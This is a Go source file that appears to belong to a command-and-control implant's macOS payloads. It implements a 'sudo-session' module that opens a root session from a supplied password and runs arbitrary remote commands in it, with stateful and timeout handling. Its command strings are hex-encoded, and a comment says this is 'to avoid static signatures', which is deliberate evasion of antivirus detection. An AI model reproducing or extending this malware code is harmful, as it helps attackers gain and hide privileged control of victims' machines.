// server/docker/payloads/Darwin/action_sudo_session.go
//go:build darwin
// +build darwin

package main

import (
	"strings"
	"time"
)

// Sudo session strings (constructed to avoid static signatures)
var (
	// Command name
	sudoSessCmdName = string([]byte{0x73, 0x75, 0x64, 0x6f, 0x2d, 0x73, 0x65, 0x73, 0x73, 0x69, 0x6f, 0x6e}) // sudo-session

	// Subcommands
	sudoSessStart          = string([]byte{0x73, 0x74, 0x61, 0x72, 0x74})                                                       // start
	sudoSessStop           = string([]byte{0x73, 0x74, 0x6f, 0x70})                                                             // stop
	sudoSessExec           = string([]byte{0x65, 0x78, 0x65, 0x63})                                                             // exec
	sudoSessExecStateful   = string([]byte{0x65, 0x78, 0x65, 0x63, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x65, 0x66, 0x75, 0x6c})       // exec-stateful
	sudoSessEnableStateful = string([]byte{0x65, 0x6e, 0x61, 0x62, 0x6c, 0x65, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x65, 0x66, 0x75, 0x6c}) // enable-stateful
	sudoSessDisableStateful = string([]byte{0x64, 0x69, 0x73, 0x61, 0x62, 0x6c, 0x65, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x65, 0x66, 0x75, 0x6c}) // disable-stateful
	sudoSessStatus         = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                 // status

	// Default user
	sudoSessDefaultUser = string([]byte{0x72, 0x6f, 0x6f, 0x74}) // root
)

type SudoSessionCommand struct{}

func (c *SudoSessionCommand) Name() string {
	return sudoSessCmdName
}

func (c *SudoSessionCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) == 0 {
		return CommandResult{
			Output: "",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	subCommand := args[0]

	switch subCommand {
	case sudoSessStart:
		if len(args) < 2 {
			return CommandResult{
				Output:      Err(E1),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		password := args[1]
		targetUser := sudoSessDefaultUser // Default to root

		// Check if a specific user was provided
		if len(args) >= 3 {
			targetUser = args[2]
		}

		// Check if session already exists
		ctx.mu.RLock()
		existingSession := ctx.SudoSession
		ctx.mu.RUnlock()

		if existingSession != nil {
			sess := existingSession.(*SudoSession)
			if sess.isActive {
				return CommandResult{
					Output:      Err(E31),
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}
		}

		// Get working directory
		ctx.mu.RLock()
		workingDir := ctx.WorkingDir
		ctx.mu.RUnlock()

		// Start new session with specified user
		session, err := StartSudoSessionAsUser(password, targetUser, workingDir)
		if err != nil {
			return CommandResult{
				Output:      ErrCtx(E27, targetUser),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// Store session in context
		ctx.mu.Lock()
		ctx.SudoSession = session
		ctx.mu.Unlock()

		return CommandResult{
			Output:      SuccCtx(S4, targetUser),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	case sudoSessExec, sudoSessExecStateful:
		if len(args) < 2 {
			return CommandResult{
				Output:      Err(E1),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// Get session
		ctx.mu.RLock()
		sessionInterface := ctx.SudoSession
		ctx.mu.RUnlock()

		if sessionInterface == nil {
			return CommandResult{
				Output:      Err(E30),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*SudoSession)
		if !session.isActive {
			return CommandResult{
				Output:      Err(E30),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// If exec-stateful, temporarily enable stateful mode
		if subCommand == sudoSessExecStateful {
			// Try to enable stateful if not already enabled
			if !session.useStateful {
				if err := session.EnableStatefulMode(); err != nil {
					return CommandResult{
						Output:      Err(E25),
						ExitCode:    1,
						CompletedAt: time.Now().Format(time.RFC3339),
					}
				}
			}
		}

		// Execute command with timeout protection
		command := strings.Join(args[1:], " ")

		// Use a goroutine with timeout to prevent hanging
		type execResult struct {
			output   string
			exitCode int
			err      error
		}

		resultChan := make(chan execResult, 1)

		go func() {
			// Short timeout for individual commands
			output, exitCode, err := session.ExecuteCommand(command, 5*time.Second)
			resultChan <- execResult{output, exitCode, err}
		}()

		// Wait with timeout
		select {
		case result := <-resultChan:
			if result.err != nil && result.output == "" {
				return CommandResult{
					Output:      Err(E25),
					ExitCode:    result.exitCode,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}

			return CommandResult{
				Output:      result.output,
				ExitCode:    result.exitCode,
				CompletedAt: time.Now().Format(time.RFC3339),
			}

		case <-time.After(6 * time.Second):
			return CommandResult{
				Output:      Err(E9),
				ExitCode:    124,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

	case sudoSessEnableStateful:
		ctx.mu.RLock()
		sessionInterface := ctx.SudoSession
		ctx.mu.RUnlock()

		if sessionInterface == nil {
			return CommandResult{
				Output:      Err(E30),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*SudoSession)
		if !session.isActive {
			return CommandResult{
				Output:      Err(E30),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		if err := session.EnableStatefulMode(); err != nil {
			return CommandResult{
				Output:      Err(E25),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		return CommandResult{
			Output:      Succ(S3),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	case sudoSessDisableStateful:
		ctx.mu.RLock()
		sessionInterface := ctx.SudoSession
		ctx.mu.RUnlock()

		if sessionInterface == nil {
			return CommandResult{
				Output:      Err(E30),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*SudoSession)
		if !session.isActive {
			return CommandResult{
				Output:      Err(E30),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session.SetStateful(false)

		return CommandResult{
			Output:      Succ(S3),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	case sudoSessStatus:
		ctx.mu.RLock()
		sessionInterface := ctx.SudoSession
		ctx.mu.RUnlock()

		if sessionInterface == nil {
			return CommandResult{
				Output:      Succ(S0),
				ExitCode:    0,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*SudoSession)

		return CommandResult{
			Output:      session.GetInfo(),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	case sudoSessStop:
		ctx.mu.Lock()
		sessionInterface := ctx.SudoSession

		if sessionInterface == nil {
			ctx.mu.Unlock()
			return CommandResult{
				Output:      Succ(S0),
				ExitCode:    0,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		session := sessionInterface.(*SudoSession)
		targetUser := session.targetUser
		if targetUser == "" {
			targetUser = sudoSessDefaultUser
		}

		err := session.Close()
		ctx.SudoSession = nil
		ctx.mu.Unlock()

		if err != nil {
			return CommandResult{
				Output:      Err(E25),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		return CommandResult{
			Output:      SuccCtx(S5, targetUser),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}

	default:
		return CommandResult{
			Output:      ErrCtx(E21, subCommand),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}
